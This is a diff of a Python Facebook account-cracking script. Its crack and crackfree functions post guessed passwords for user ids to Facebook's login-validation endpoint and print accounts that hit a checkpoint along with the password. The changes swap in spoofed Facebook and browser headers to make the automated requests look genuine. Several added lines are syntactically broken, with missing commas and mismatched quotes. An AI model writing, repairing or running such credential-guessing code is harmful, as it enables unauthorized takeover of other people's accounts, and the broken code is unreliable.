@@ -771,25 +771,25 @@ def crack(idf,pwv):
             dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
             koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
             koki+=' m_pixel_ratio=2.625; wd=412x756'
-            heade = {'Host': 'm.facebook.com', 
-                     'x-fb-rlafr': '0',
-                     'access-control-allow-origin': '*',
-                     'facebook-api-version': 'v17.0',
-                     'strict-transport-security': 'max-age=15552000; preload',
-                     'pragma': 'no-cache',
-                     'cache-control': 'private, no-cache, no-store, must-revalidate',
-                     'x-fb-request-id': 'AvOUoN_giaERbm73BpyzIMA',
-                     'x-fb-trace-id': 'Dv0YTCHBsHQ',
-                     'x-fb-rev': '1008376653',
-                     'x-fb-debug': 'SkalbXhqZaGFaeWZygwm3HdEfg3X7Natm42kkzGCN8WfzUf5I8UNjDD8JwAFBhH1Pm9HIoELjHIwMoDwymf7Kg==','viewport-width': '980',
-                     'sec-ch-ua': '"Not A;Brand";v="24", "Chromium";v="116"',
-                     'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',
-                     'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1',
-                     'user-agent': ua,
-                     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                     'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1',
-                     'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br',
-                     'accept-language': 'en-US,en;q=0.9'}
+            heade = {'Host': 'm.facebook.com', 'viewport-width': '980',
+                                'x-fb-rlafr': '0',
+                                'access-control-allow-origin': '*',
+                                'facebook-api-version': 'v17.0',
+                                'strict-transport-security': 'max-age=15552000; preload',
+                                'pragma': 'no-cache'
+                                'cache-control': 'private, no-cache, no-store, must-revalidate',
+                                'x-fb-request-id': 'AGjGOiwTpxVnQRsHQ1LkZsb',
+                                'x-fb-trace-id': 'E1GJI1BGkTq',
+                                'x-fb-rev': '1008400429'
+                                'x-fb-debug': 'wN0dzDjuVxxeKnbFWqGw2pB8IuKB8YWsds/ErcfHz+h68uwsBD+74IrC9en+v5rR3XDkvSZdv/KBLlesu5j8cg==',
+                                'sec-ch-ua': ''"NotA;Brand";v="24", "Chromium";v="116"', "Google Chrome";v="116"',
+                                'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',
+                                'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1',
+                                'user-agent': ua,
+                                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                                'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1',
+                                'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br',
+                                'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
                 print(f'\r\033[0;93m[EMON VAI-Cp] {idf} • {pw}')
@@ -835,10 +835,10 @@ def crackfree(idf, pwv):
                                 "strict-transport-security": "max-age=15552000; preload",
                                 "pragma": "no-cache",
                                 "cache-control": "private, no-cache, no-store, must-revalidate",
-                                "x-fb-request-id": "AGAb1r5gST5f28zghRUGGlI",
-                                "x-fb-trace-id": "BxuXlSKY1W9",
-                                "x-fb-rev": "1008295290",
-                                "x-fb-debug": "8e3oC8c55BGj3V1DOvQ0T3rsDRCPe0nNssVFSnLirvR2mN7qOfgNEz0FkqKjNG8eSp00BtdAG7W9pGwSURyhiA==",
+                                "x-fb-request-id": "AGjGOiwTpxVnQRsHQ1LkZsb"
+                                "x-fb-trace-id": "E1GJI1BGkTq",
+                                "x-fb-rev": "1008400429"
+                                "x-fb-debug": "wN0dzDjuVxxeKnbFWqGw2pB8IuKB8YWsds/ErcfHz+h68uwsBD+74IrC9en+v5rR3XDkvSZdv/KBLlesu5j8cg==",
                                 "upgrade-insecure-requests": "1", "user-agent": ua2,
                                 "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                                 "dnt": "1", "x-requested-with": "mark.via.gp", "sec-fetch-site": "same-origin",
@@ -857,12 +857,12 @@ def crackfree(idf, pwv):
                      'access-control-allow-origin': '*',
                      'facebook-api-version': 'v17.0',
                      'strict-transport-security': 'max-age=15552000; preload',
-                     'pragma': 'no-cache',
+                     'pragma': 'no-cache'
                      'cache-control': 'private, no-cache, no-store, must-revalidate',
-                     'x-fb-request-id': 'AGAb1r5gST5f28zghRUGGlI',
-                     'x-fb-trace-id': 'BxuXlSKY1W9',
-                     'x-fb-rev': '1008295290',
-                     'x-fb-debug': '8e3oC8c55BGj3V1DOvQ0T3rsDRCPe0nNssVFSnLirvR2mN7qOfgNEz0FkqKjNG8eSp00BtdAG7W9pGwSURyhiA==','viewport-width': '980',
+                     'x-fb-request-id': 'AGjGOiwTpxVnQRsHQ1LkZsb',
+                     'x-fb-trace-id': 'E1GJI1BGkTq',
+                     'x-fb-rev': '1008400429'
+                     'x-fb-debug': 'wN0dzDjuVxxeKnbFWqGw2pB8IuKB8YWsds/ErcfHz+h68uwsBD+74IrC9en+v5rR3XDkvSZdv/KBLlesu5j8cg==','viewport-width': '980',
                      'sec-ch-ua': '"Not A;Brand";v="24", "Chromium";v="116"',
                      'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',
                      'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1',
